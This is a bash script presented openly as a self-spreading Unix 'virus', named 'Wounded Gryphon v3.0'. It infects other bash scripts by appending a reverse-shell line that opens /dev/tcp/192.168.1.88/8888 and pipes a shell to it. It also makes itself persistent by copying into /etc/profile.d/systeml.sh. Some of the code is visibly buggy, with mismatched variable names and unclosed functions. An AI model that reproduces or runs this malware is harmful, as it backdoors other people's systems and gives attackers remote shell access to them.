#!/bin/bash

#                   # 
#    __      __      \                .___         .___
#   /  \    /  \____  \_ __  ____   __| _/____   __| _/ ---------
#   \   \/\/   /  _ \|  |  \/    \ / __ _/ __ \ / __ | -----------
#    \        (  <_> |  |  |   |  / /_/ \  ___// /_/ | ------------
#     \__/\  / \____/|____/|___|  \____ |\___  \____ | -----------
#     _____\/                   \/ __  \/    \/     \/ ----------
#    /  ___ \_______ ___.________ |  |__   ____   ____  ---------
#   /   \  __\_  __ <   |  \____ \|  |  \ /  _ \ /    \ ----------
#   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
#    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
#       /   \/       \/    |__|        \/      \     \/ ---------
#      / Wonded Gryphon v3.0  ______----------- # ---------------
#     #          _______,---'__,---' ---------------------------
#            _,-'---_---__,---' -----------------------------
#     /_ #   (,  ---____', --------------------------------
#    /  /,,   `, ,-' -------------------------------------
#   ;/)   ,',,_/,' # -------------------------------------
#   | /\   ,.'//\ / ---------------------------------------
#   `-` \ ,,'    /.   # -------------------------------------
#        `',   ,-- `./ -----------------------------------------
#        '/ / |     /`, -----------------------------------------
#        //'',.\_    .\\ -----,{==>- ------------------------------
#     __//   __;_`-  \ `;.__,;' ------------------------------------
#   ((,--,) (((,------;  `--' --------------------------------------
#
# Created by TheG0df2ther a MalDev101 project
# This is only an experiment but it can be dangerous.
# I am not responsible for the damage.
# This is a virus that works on unix systems with bash installed.
# Tested on Linux (Ubuntu, Debian) and MacOS (OSX)

SHEBANG="#!/bin/bash"

ME="$0"

CAT=$(cat "$me")

FLAG="#arrow"

# BANNER function
function banner1() {
   
   echo "                _  #       _ "
   echo "              _/|  \ _   |\_ "
   echo "            _/_ |   \|\\ | _\ "
   echo "          _/_/| /  /   \|\ |\_\_     # "
   echo "        _/_/  |/  /  _  \/\|  \_\_  / "
   echo "      _/_/    ||  | | \*/ ||    \_\/   "
   echo "     /_/  | | |\  | \_ /  /| | |  \_\   # "
   echo "    //    ||| | \_/   \__/ | |||    \\ / "
   echo "   // __| ||\  \ ||    || /  /|| |__ \/ "
   echo "  //_/ \|||| \/\\||    ||//\/ ||||/ \_\\ "
   echo " ///    \\\\/   /()    ()\   \////    \\\ "
   echo " |/      \/    |    |    |     \/      \| "
   echo "              /_|  | |_  \  # "
   echo "              ///_| |_||\_ \/ "
   echo "              |//||/||\/||\/       WOUNDED GRYPHON 3.0v "
   echo "               / || ||/||/\/    "
   echo "                 {}/|| {}        "
   echo "                    ||            "
   echo "                    () "

function banner_text() {
   
   echo "
   
   # Created by TheG0df2ther a MalDev101 project
   # This is only an experiment but it can be dangerous.
   # I am not responsible for the damage.
   # This is a virus that works on unix systems with bash installed.
   # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
   
   # Check if files are written in bash then start infecting them.
   # The virus ignores non bash scripts and already infected files "


function check() {
   
   local IFBASH=$(grep -Fx "$SHEBANG" *)
   
   if [ "$IFBASH" =~ .*"$SHEBANG" ]

   then
      
      local LISTNOTREADY=$(echo "$IFBASH" | sed 's|:#!/bin/bash||')
      local LISTNOTREADYD=$(echo "$LISTNOTREADY" | tr "\n" " ")
      local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
      local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | sed 's|:#arrow||')
      LIST=$(echo "$LISTNOTREADY2D" | tr "\n" " ")
       
      if [ "$LIST" == "" ]
       
      then
         
         foldercheck
      
      else
         
         infect
      
      fi
      
    else
       
       foldercheck
       
    fi
   
}

function foldercheck() {
   
   local LDIR=$(ls -d *)
   
   if [ "$LDIR" == "" ]

   then
      cd /

      check

   else
          
      echo "$LDIR" > LIST.txt
      
      CDDIR=$(shuf -n1 LIST.txt)
      
      cd "$CDDIR"
      
      check
   fi


# PAYLOAD

function infect() {
   
   # String you want to append to sh file. Example: reverse tcp bash (metasploit).
   # Responds to:
   # IP: 192.168.1.88
   # PORT: 8888

   echo "0<&205-;exec 205<>/dev/tcp/192.168.1.88/8888;sh <&205 >&205 2>&205" >> "$LIST"
   echo "$FLAG" >> "$LIST"
}

# start infecting autostart

banner1

banner_text

echo "$CAT" > /etc/profile.d/systeml.sh

chmod 755 /etc/profile.d/systeml.sh

cd /etc/profile.d/

check
      
#    |\                     /)      
#  /\_\\__               (_//
# |   `>\-`     _._       //`)  
#  \ /` \\  _.-.---.`-._ //
#   `    \|`  /     \  `|/
#         |   \.@-@./   |
#         |.../`\_/`\...|
#         |:://  _  \\::|
#         | | \     )|_ |
#         \/`\_`>  <_/ \/
#          \__/'---'\__/
#           `-. ::: .-'
#            //`:::`\\
#           //   '   \\
#          |/         \\
